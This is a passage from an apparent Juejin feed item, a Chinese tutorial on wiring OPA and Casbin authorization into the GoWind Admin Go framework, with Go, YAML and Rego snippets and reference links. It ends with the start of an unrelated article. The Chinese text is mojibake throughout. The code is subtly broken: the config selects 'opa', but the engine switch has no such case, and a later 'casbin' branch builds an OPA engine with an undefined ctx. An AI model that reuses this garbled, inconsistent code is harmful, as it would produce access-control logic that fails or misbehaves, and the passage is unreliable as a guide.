<span class="hljs-keyword">type</span> Authorizer <span class="hljs-keyword">struct</span> {
	log *log.Helper

	roleRepo        *RoleRepo
	apiResourceRepo *ApiResourceRepo

	engine authzEngine.Engine
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewAuthorizer</span><span class="hljs-params">(
	logger log.Logger,
	cfg *conf.Bootstrap,
	roleRepo *RoleRepo,
	apiResourceRepo *ApiResourceRepo,
)</span></span> *Authorizer {
	a := &amp;Authorizer{
		log:             log.NewHelper(log.With(logger, <span class="hljs-string">"module"</span>, <span class="hljs-string">"authorizer/repo/admin-service"</span>)),
		roleRepo:        roleRepo,
		apiResourceRepo: apiResourceRepo,
	}

	a.init(cfg)

	<span class="hljs-keyword">return</span> a
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> init(cfg *conf.Bootstrap) {
	a.engine = a.newEngine(cfg)

	<span class="hljs-keyword">if</span> err := a.ResetPolicies(context.Background()); err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"reset policies error: %v"</span>, err)
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> newEngine(cfg *conf.Bootstrap) authzEngine.Engine {
	<span class="hljs-keyword">if</span> cfg.Authz == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	}

	ctx := context.Background()

	<span class="hljs-keyword">switch</span> cfg.GetAuthz().GetType() {
	<span class="hljs-keyword">default</span>:
		<span class="hljs-keyword">fallthrough</span>
	<span class="hljs-keyword">case</span> <span class="hljs-string">"noop"</span>:
		state, err := noop.NewEngine(ctx)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"new noop engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}
		<span class="hljs-keyword">return</span> state

	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		state, err := casbin.NewEngine(ctx)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"init casbin engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}
		<span class="hljs-keyword">return</span> state
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> Engine() authzEngine.Engine {
	<span class="hljs-keyword">return</span> a.engine
}

<span class="hljs-comment">// ResetPolicies é‡ç½®ç­–ç•¥</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> ResetPolicies(ctx context.Context) <span class="hljs-type">error</span> {
	<span class="hljs-comment">//a.log.Info("*******************reset policies")</span>

	roles, err := a.roleRepo.List(ctx, &amp;pagination.PagingRequest{NoPaging: trans.Ptr(<span class="hljs-literal">true</span>)})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"failed to list roles: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">if</span> roles == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(roles.Items) &lt; <span class="hljs-number">1</span> {
		a.log.Warnf(<span class="hljs-string">"no roles found to set policies"</span>)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// No roles to set policies</span>
	}

	apis, err := a.apiResourceRepo.List(ctx, &amp;pagination.PagingRequest{NoPaging: trans.Ptr(<span class="hljs-literal">true</span>)})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"failed to list APIs: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">if</span> apis == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(apis.Items) &lt; <span class="hljs-number">1</span> {
		a.log.Warnf(<span class="hljs-string">"no APIs found to set policies for roles"</span>)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// No APIs to set policies</span>
	}

	<span class="hljs-comment">//a.log.Debugf("roles [%d] apis [%d]", len(roles.Items), len(apis.Items))</span>

	<span class="hljs-keyword">var</span> policies authzEngine.PolicyMap

	<span class="hljs-keyword">switch</span> a.engine.Name() {
	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		<span class="hljs-keyword">if</span> policies, err = a.generateCasbinPolicies(roles, apis); err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"generate casbin policies error: %v"</span>, err)
			<span class="hljs-keyword">return</span> err
		}

	<span class="hljs-keyword">case</span> <span class="hljs-string">"noop"</span>:
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>

	<span class="hljs-keyword">default</span>:
		a.log.Warnf(<span class="hljs-string">"unknown engine name: %s"</span>, a.engine.Name())
		<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"unknown authz engine name"</span>)
	}

	<span class="hljs-comment">//a.log.Debugf("***************** policy rules len: %v", len(rules))</span>

	<span class="hljs-keyword">if</span> err = a.engine.SetPolicies(context.Background(), policies, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"set policies error: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}
	a.log.Infof(<span class="hljs-string">"Reloaded policy rules"</span>)

	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// generateCasbinPolicies ç”Ÿæˆ Casbin ç­–ç•¥</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> generateCasbinPolicies(roles *userV1.ListRoleResponse, apis *adminV1.ListApiResourceResponse) (authzEngine.PolicyMap, <span class="hljs-type">error</span>) {
	<span class="hljs-keyword">var</span> rules []casbin.PolicyRule
	apiSet := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>{})

	domain := <span class="hljs-string">"*"</span>

	<span class="hljs-keyword">for</span> _, role := <span class="hljs-keyword">range</span> roles.Items {
		<span class="hljs-keyword">if</span> role.GetId() == <span class="hljs-number">0</span> {
			<span class="hljs-keyword">continue</span> <span class="hljs-comment">// Skip if role or API ID is not set</span>
		}

		<span class="hljs-keyword">for</span> _, apiId := <span class="hljs-keyword">range</span> role.GetApis() {
			apiSet[apiId] = <span class="hljs-keyword">struct</span>{}{}
		}

		<span class="hljs-keyword">for</span> _, api := <span class="hljs-keyword">range</span> apis.Items {
			<span class="hljs-keyword">if</span> api.GetId() == <span class="hljs-number">0</span> {
				<span class="hljs-keyword">continue</span> <span class="hljs-comment">// Skip if role or API ID is not set</span>
			}

			<span class="hljs-keyword">if</span> _, exists := apiSet[api.GetId()]; exists {
				rules = <span class="hljs-built_in">append</span>(rules, casbin.PolicyRule{
					PType: <span class="hljs-string">"p"</span>,
					V0:    role.GetCode(),
					V1:    api.GetPath(),
					V2:    api.GetMethod(),
					V3:    domain,
				})
			}
		}
	}

	policies := authzEngine.PolicyMap{
		<span class="hljs-string">"policies"</span>: rules,
		<span class="hljs-string">"projects"</span>: authzEngine.MakeProjects(),
	}

	<span class="hljs-keyword">return</span> policies, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-17">3.2 ä¾èµ–æ³¨å…¥ï¼šæ³¨å†Œ Authorizer åˆ° Wire å®¹å™¨</h4>
<p>GoWind Admin ä½¿ç”¨ Wire å®ç°ä¾èµ–æ³¨å…¥ï¼Œéœ€ä¿®æ”¹ <code>app/admin/service/internal/data/init.go</code>ï¼Œå°† <code>NewAuthorizer</code> æ³¨å†Œåˆ°ä¾èµ–å®¹å™¨ï¼Œç¡®ä¿æ¡†æ¶å¯åŠ¨æ—¶è‡ªåŠ¨åˆå§‹åŒ–æƒé™ç®¡ç†å™¨ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/data/init.go</span>

<span class="hljs-comment">//go:build wireinject</span>
<span class="hljs-comment">// +build wireinject</span>

<span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/google/wire"</span>

<span class="hljs-comment">// ProviderSet æ•°æ®å±‚ä¾èµ–æ³¨å…¥é›†åˆ</span>
<span class="hljs-keyword">var</span> ProviderSet = wire.NewSet(
    NewAuthorizer,        <span class="hljs-comment">// æ³¨å†Œæƒé™ç®¡ç†å™¨ï¼ˆæ ¸å¿ƒï¼‰</span>
    NewRoleRepo,          <span class="hljs-comment">// æ³¨å†Œè§’è‰²æ•°æ®ä»“åº“</span>
    NewApiResourceRepo,   <span class="hljs-comment">// æ³¨å†Œ API èµ„æºæ•°æ®ä»“åº“</span>
    <span class="hljs-comment">// ... å…¶ä»–æ•°æ®ä»“åº“ï¼ˆå¦‚ç”¨æˆ·ä»“åº“ã€èœå•ä»“åº“ç­‰ï¼‰</span>
)
</code></pre>
<h4 data-id="heading-18">3.3 ä¸­é—´ä»¶é›†æˆï¼šåµŒå…¥ REST æœåŠ¡è¯·æ±‚é“¾è·¯</h4>
<p>å°† OPA æƒé™æ ¡éªŒä¸­é—´ä»¶åµŒå…¥ REST æœåŠ¡å™¨çš„è¯·æ±‚é“¾è·¯ï¼Œå®ç°å¯¹æ‰€æœ‰ API æ¥å£çš„æƒé™æ‹¦æˆªã€‚ä¿®æ”¹ <code>app/admin/service/internal/server/rest.go</code>ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/server/rest.go</span>

<span class="hljs-keyword">package</span> server

<span class="hljs-comment">// NewMiddleware åˆ›å»ºä¸­é—´ä»¶</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newRestMiddleware</span><span class="hljs-params">(
	logger log.Logger,
	authenticator authnEngine.Authenticator,
	authorizer *data.Authorizer,
)</span></span> []middleware.Middleware {
	<span class="hljs-keyword">var</span> ms []middleware.Middleware
	ms = <span class="hljs-built_in">append</span>(ms, logging.Server(logger))

	ms = <span class="hljs-built_in">append</span>(ms, selector.Server(
		authn.Server(authenticator),
		auth.Server(),
		authz.Server(authorizer.Engine()),
	).Match(newRestWhiteListMatcher()).Build())

	<span class="hljs-keyword">return</span> ms
}

<span class="hljs-comment">// NewRESTServer new an HTTP server.</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewRESTServer</span><span class="hljs-params">(
    cfg *conf.Bootstrap, logger log.Logger,
	authenticator authnEngine.Authenticator, authorizer *data.Authorizer,
)</span></span> {
    ...

	srv := rpc.CreateRestServer(cfg,
		newRestMiddleware(logger, authenticator, authorizer)...,
	)

    ...
}
</code></pre>
<h4 data-id="heading-19">3.4 é…ç½®å¯ç”¨ï¼šä¿®æ”¹ auth.yaml å¯ç”¨ OPA</h4>
<p>ä¿®æ”¹ <code>app/admin/service/configs/auth.yaml</code>ï¼Œå°†æƒé™å¼•æ“ç±»å‹è®¾ç½®ä¸º <code>opa</code>ï¼Œå¯ç”¨æƒé™æ ¡éªŒï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># app/admin/service/configs/auth.yaml</span>
<span class="hljs-comment"># è®¤è¯ä¸æˆæƒé…ç½®</span>
<span class="hljs-attr">auth:</span>
  <span class="hljs-comment"># è®¤è¯é…ç½®ï¼ˆå¦‚ JWTã€OAuth2 ç­‰ï¼Œæ ¹æ®å®é™…éœ€æ±‚é…ç½®ï¼‰</span>
  <span class="hljs-attr">authn:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">"jwt"</span>
    <span class="hljs-attr">jwt:</span>
      <span class="hljs-attr">secret:</span> <span class="hljs-string">"your-jwt-secret"</span>
      <span class="hljs-attr">expires_at:</span> <span class="hljs-number">3600</span>

<span class="hljs-comment"># æˆæƒé…ç½®ï¼ˆæ ¸å¿ƒï¼‰</span>
<span class="hljs-attr">authz:</span>
  <span class="hljs-attr">type:</span> <span class="hljs-string">"opa"</span>  <span class="hljs-comment"># å¯ç”¨ OPA å¼•æ“ï¼ˆå¯é€‰ï¼šopa/noopï¼‰</span>
  <span class="hljs-comment"># OPA é¢å¤–é…ç½®ï¼ˆå¯é€‰ï¼Œæ ¹æ®å®é™…éœ€æ±‚æ‰©å±•ï¼‰</span>
  <span class="hljs-comment"># opa:</span>
  <span class="hljs-comment">#   cache:  # ç­–ç•¥ç¼“å­˜é…ç½®</span>
  <span class="hljs-comment">#     enabled: true</span>
  <span class="hljs-comment">#     ttl: 300s  # ç¼“å­˜è¿‡æœŸæ—¶é—´</span>
  <span class="hljs-comment">#   watch: true  # ç›‘å¬ç­–ç•¥æ–‡ä»¶å˜åŒ–ï¼ŒåŠ¨æ€é‡è½½ï¼ˆå¼€å‘ç¯å¢ƒæ¨èï¼‰</span>
</code></pre>
<h4 data-id="heading-20">3.5 è‡ªå®šä¹‰æ¨¡å‹ï¼šå†…åµŒè‡ªå®šä¹‰ OPA ç­–ç•¥</h4>
<p>è‹¥é»˜è®¤çš„ RBAC ç­–ç•¥æ¨¡å‹ä¸æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼ˆå¦‚æ”¯æŒæ•°æ®æƒé™ã€å¤šç§Ÿæˆ·éš”ç¦»ç­‰ï¼‰ï¼Œå¯è‡ªå®šä¹‰ Rego ç­–ç•¥æ–‡ä»¶ï¼Œé€šè¿‡ Go å†…ç½®çš„ <code>//go:embed</code> æŒ‡ä»¤å†…åµŒåˆ°é¡¹ç›®ä¸­ï¼Œå®ç°ç­–ç•¥ä¸ç¨‹åºçš„ä¸€ä½“åŒ–éƒ¨ç½²ã€‚</p>
<h5 data-id="heading-21">æ­¥éª¤ 1ï¼šåˆ›å»ºè‡ªå®šä¹‰ç­–ç•¥æ–‡ä»¶</h5>
<p>åœ¨ <code>app/admin/service/cmd/server/assets/</code> ç›®å½•ä¸‹åˆ›å»º <code>opa_custom.rego</code>ï¼Œç¼–å†™è‡ªå®šä¹‰ç­–ç•¥ï¼ˆç¤ºä¾‹ï¼šæ”¯æŒå¤šç§Ÿæˆ·çš„ RBAC è§„åˆ™ï¼‰ï¼š</p>
<pre><code class="hljs language-rego" lang="rego">package authz

default allow = false

# è‡ªå®šä¹‰è§„åˆ™ï¼šç§Ÿæˆ·å†…ç®¡ç†å‘˜å¯è®¿é—®æ‰€æœ‰æ¥å£
allow {
    input.tenant_id != ""  # ç§Ÿæˆ·IDéç©º
    input.user_role == "tenant_admin"  # ç”¨æˆ·ä¸ºç§Ÿæˆ·ç®¡ç†å‘˜
}

# è‡ªå®šä¹‰è§„åˆ™ï¼šæ™®é€šç”¨æˆ·ä»…å¯è®¿é—®è‡ªèº«ç§Ÿæˆ·çš„èµ„æº
allow {
    input.tenant_id != ""
    input.user_role == "user"
    input.resource_tenant_id == input.tenant_id  # èµ„æºç§Ÿæˆ·IDä¸ç”¨æˆ·ç§Ÿæˆ·IDä¸€è‡´
    input.method == "GET"  # ä»…å…è®¸æŸ¥è¯¢æ“ä½œ
}

# è‡ªå®šä¹‰è§„åˆ™ï¼šè¶…çº§ç®¡ç†å‘˜å¿½ç•¥ç§Ÿæˆ·é™åˆ¶
allow {
    input.user_role == "super_admin"
}
</code></pre>
<h5 data-id="heading-22">æ­¥éª¤ 2ï¼šå†…åµŒç­–ç•¥æ–‡ä»¶</h5>
<p>ä¿®æ”¹ <code>app/admin/service/cmd/server/assets/assets.go</code>ï¼Œé€šè¿‡ <code>//go:embed</code> æŒ‡ä»¤å°†è‡ªå®šä¹‰ç­–ç•¥æ–‡ä»¶å†…åµŒåˆ°ç¨‹åºä¸­ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/cmd/server/assets/assets.go</span>
<span class="hljs-keyword">package</span> assets

<span class="hljs-keyword">import</span> _ <span class="hljs-string">"embed"</span>

<span class="hljs-comment">// å†…åµŒé»˜è®¤ RBAC ç­–ç•¥ï¼ˆåŸæœ‰ï¼‰</span>
<span class="hljs-comment">//go:embed opa_rbac.rego</span>
<span class="hljs-keyword">var</span> OpaRbacRego []<span class="hljs-type">byte</span>

<span class="hljs-comment">// å†…åµŒè‡ªå®šä¹‰ OPA ç­–ç•¥ï¼ˆæ–°å¢ï¼‰</span>
<span class="hljs-comment">//go:embed opa_custom.rego</span>
<span class="hljs-keyword">var</span> OpaCustomRego []<span class="hljs-type">byte</span>
</code></pre>
<h5 data-id="heading-23">æ­¥éª¤ 3ï¼šåŠ è½½è‡ªå®šä¹‰ç­–ç•¥</h5>
<p>ä¿®æ”¹ <code>Authorizer.newEngine</code> æ–¹æ³•ï¼ŒåŠ è½½å†…åµŒçš„è‡ªå®šä¹‰ç­–ç•¥æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"go-wind-admin/app/admin/service/cmd/server/assets"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> newEngine(cfg *conf.Bootstrap) authzEngine.Engine {
	<span class="hljs-keyword">switch</span> cfg.GetAuthz().GetType() {
	<span class="hljs-keyword">default</span>:
		<span class="hljs-keyword">fallthrough</span>

	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		state, err := opa.NewEngine(ctx,
			opa.WithModulesFromString(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>{
				<span class="hljs-string">"custom.rego"</span>: <span class="hljs-type">string</span>(assets.OpaCustomRego),
			}),
		)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"init opa engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}

		<span class="hljs-keyword">if</span> err = state.InitModulesFromString(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>{
			<span class="hljs-string">"custom.rego"</span>: <span class="hljs-type">string</span>(assets.OpaCustomRego),
		}); err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"init opa modules error: %v"</span>, err)
		}

		<span class="hljs-keyword">return</span> state
	}
}
</code></pre>
<h3 data-id="heading-24">å››ã€é¡¹ç›®èµ„æºä¸å‚è€ƒèµ„æ–™</h3>
<h4 data-id="heading-25">4.1 æ ¸å¿ƒé¡¹ç›®ä»“åº“</h4>
<ul>
<li>GoWind Adminï¼ˆGiteeï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://gitee.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">gitee.com/tx7do/go-wiâ€¦</a></li>
<li>GoWind Adminï¼ˆGitHubï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://github.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">github.com/tx7do/go-wiâ€¦</a></li>
<li>Kratos-Authzï¼ˆOPA/Casbin å°è£…ç»„ä»¶ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fkratos-authz" target="_blank" title="https://github.com/tx7do/kratos-authz" ref="nofollow noopener noreferrer">github.com/tx7do/kratoâ€¦</a></li>
<li>OPA å®˜æ–¹ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopen-policy-agent%2Fopa%2F" target="_blank" title="https://github.com/open-policy-agent/opa/" ref="nofollow noopener noreferrer">github.com/open-policyâ€¦</a></li>
</ul>
<h4 data-id="heading-26">4.2 å­¦ä¹ å‚è€ƒèµ„æ–™</h4>
<h5 data-id="heading-27">å®˜æ–¹æ–‡æ¡£</h5>
<ul>
<li>OPA å®˜æ–¹ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openpolicyagent.org%2F" target="_blank" title="https://www.openpolicyagent.org/" ref="nofollow noopener noreferrer">www.openpolicyagent.org/</a></li>
<li>OPA äº¤äº’å¼è§£é‡Šå™¨ï¼ˆåœ¨çº¿æµ‹è¯• Regoï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fplay.openpolicyagent.org%2F" target="_blank" title="https://play.openpolicyagent.org/" ref="nofollow noopener noreferrer">play.openpolicyagent.org/</a></li>
</ul>
<h5 data-id="heading-28">å…¥é—¨ä¸è¿›é˜¶æ•™ç¨‹</h5>
<ul>
<li>ã€Šç­–ç•¥å³ä»£ç â€”â€”Open Policy Agentï¼ˆOPAï¼‰ç®€ä»‹ã€‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloudnative.to%2Fblog%2Fintroducing-policy-as-code-the-open-policy-agent-opa%2F" target="_blank" title="https://cloudnative.to/blog/introducing-policy-as-code-the-open-policy-agent-opa/" ref="nofollow noopener noreferrer">cloudnative.to/blog/introdâ€¦</a></li>
<li>ã€ŠHow to Write Your First Rules in Regoã€‹ï¼ˆå®˜æ–¹å…¥é—¨ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.styra.com%2Fblog%2Fhow-to-write-your-first-rules-in-rego-the-policy-language-for-opa%2F" target="_blank" title="https://www.styra.com/blog/how-to-write-your-first-rules-in-rego-the-policy-language-for-opa/" ref="nofollow noopener noreferrer">www.styra.com/blog/how-toâ€¦</a></li>
<li>ã€ŠOPAè¿›é˜¶-å‡½æ•°ä¸è™šæ‹Ÿæ–‡æ¡£è¦åˆ†æ¸…ã€‹ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fblog.newbmiao.com%2F2020%2F03%2F18%2Fopa-func-and-virtual-doc.html" target="_blank" title="http://blog.newbmiao.com/2020/03/18/opa-func-and-virtual-doc.html" ref="nofollow noopener noreferrer">blog.newbmiao.com/2020/03/18/â€¦</a></li>
<li>ã€ŠOPAè¿›é˜¶-ç®€æ´çš„æ¨å¯¼å¼ã€‹ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fblog.newbmiao.com%2F2020%2F03%2F20%2Fopa-comprehensions.html" target="_blank" title="http://blog.newbmiao.com/2020/03/20/opa-comprehensions.html" ref="nofollow noopener noreferrer">blog.newbmiao.com/2020/03/20/â€¦</a></li>
</ul>
<h5 data-id="heading-29">å®è·µæ¡ˆä¾‹</h5>
<ul>
<li>ã€ŠOpen Policy Agent - å¿«é€Ÿå°å…¥ Authz è‡³ Microservice æ¶æ§‹ã€‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fengineering.linecorp.com%2Fzh-hant%2Fblog%2Fopen-policy-agent-authz-in-microservice%2F" target="_blank" title="https://engineering.linecorp.com/zh-hant/blog/open-policy-agent-authz-in-microservice/" ref="nofollow noopener noreferrer">engineering.linecorp.com/zh-hant/bloâ€¦</a></li>
<li>ã€ŠOpen Policy Agent: What Is OPA and How It Works (Examples)ã€‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fspacelift.io%2Fblog%2Fwhat-is-open-policy-agent-and-how-it-works" target="_blank" title="https://spacelift.io/blog/what-is-open-policy-agent-and-how-it-works" ref="nofollow noopener noreferrer">spacelift.io/blog/what-iâ€¦</a></li>
</ul>
<h3 data-id="heading-30">äº”ã€é›†æˆéªŒè¯ä¸å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-31">5.1 é›†æˆéªŒè¯æ­¥éª¤</h4>
<ol>
<li>å¯åŠ¨ GoWind Admin æœåŠ¡ï¼Œç¡®ä¿ OPA å¼•æ“åˆå§‹åŒ–æˆåŠŸï¼ˆæŸ¥çœ‹æ—¥å¿— <code>successfully reloaded xxx policy rules</code>ï¼‰ï¼›</li>
<li>é€šè¿‡ Postman ç­‰å·¥å…·å‘é€è¯·æ±‚ï¼š
<ul>
<li>æœªè®¤è¯è¯·æ±‚ï¼šè®¿é—®éœ€è¦æƒé™çš„æ¥å£ï¼Œåº”è¿”å› 401 æœªæˆæƒï¼›</li>
<li>å·²è®¤è¯ä½†æ— æƒé™ï¼šä½¿ç”¨æ™®é€šç”¨æˆ· Token è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼Œåº”è¿”å› 403 ç¦æ­¢è®¿é—®ï¼›</li>
<li>å·²è®¤è¯ä¸”æœ‰æƒé™ï¼šä½¿ç”¨ç®¡ç†å‘˜ Token è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼Œåº”è¿”å› 200 æˆåŠŸã€‚</li>
</ul>
</li>
<li>ä¿®æ”¹è§’è‰²-API æƒé™æ˜ å°„ï¼Œè°ƒç”¨ <code>Authorizer.ResetPolicies</code> æ¥å£é‡ç½®ç­–ç•¥ï¼ŒéªŒè¯æƒé™åŠ¨æ€æ›´æ–°æ˜¯å¦ç”Ÿæ•ˆã€‚</li>
</ol>
<h4 data-id="heading-32">5.2 å¸¸è§é—®é¢˜æ’æŸ¥</h4>
<ul>
<li>OPA å¼•æ“åˆå§‹åŒ–å¤±è´¥ï¼šæ£€æŸ¥ç­–ç•¥æ–‡ä»¶è¯­æ³•æ˜¯å¦æ­£ç¡®ï¼ˆå¯é€šè¿‡ OPA åœ¨çº¿è¯•ç‚¼åœºéªŒè¯ï¼‰ã€å†…åµŒæ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼›</li>
<li>æƒé™æ ¡éªŒä¸ç”Ÿæ•ˆï¼šç¡®è®¤ä¸­é—´ä»¶é¡ºåºï¼ˆå…ˆè®¤è¯åæˆæƒï¼‰ã€ç™½åå•é…ç½®æ˜¯å¦æ­£ç¡®ã€è¯·æ±‚è¾“å…¥æ˜¯å¦åŒ…å« <code>user</code>ã€<code>role</code> ç­‰ç­–ç•¥æ‰€éœ€å­—æ®µï¼›</li>
<li>ç­–ç•¥æ›´æ–°ä¸ç”Ÿæ•ˆï¼šç¡®ä¿ä¿®æ”¹æƒé™åè°ƒç”¨äº† <code>ResetPolicies</code> æ–¹æ³•ï¼Œé‡æ–°åŠ è½½ç­–ç•¥åˆ° OPA å¼•æ“ï¼›</li>
<li>æ€§èƒ½é—®é¢˜ï¼šå¯ç”¨ OPA ç­–ç•¥ç¼“å­˜ï¼ˆé…ç½® <code>authz.opa.cache</code>ï¼‰ï¼Œå‡å°‘é‡å¤ç­–ç•¥è®¡ç®—ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆç”µè„‘éœ€è¦"å†…å­˜"å’Œ"ç¡¬ç›˜"ï¼Ÿâ€”â€”å­˜å‚¨é‡‘å­—å¡”çš„ç§˜å¯†]]></title>    <link>https://juejin.cn/post/7583891046206160948</link>    <guid>https://juejin.cn/post/7583891046206160948</guid>    <pubDate>2025-12-15T11:44:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583891046206160948" data-draft-id="7583921477613273123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆç”µè„‘éœ€è¦&quot;å†…å­˜&quot;å’Œ&quot;ç¡¬ç›˜&quot;ï¼Ÿâ€”â€”å­˜å‚¨é‡‘å­—å¡”çš„ç§˜å¯†"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T11:44:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆç”µè„‘éœ€è¦"å†…å­˜"å’Œ"ç¡¬ç›˜"ï¼Ÿâ€”â€”å­˜å‚¨é‡‘å­—å¡”çš„ç§˜å¯†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T11:44:55.000Z" title="Mon Dec 15 2025 11:44:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
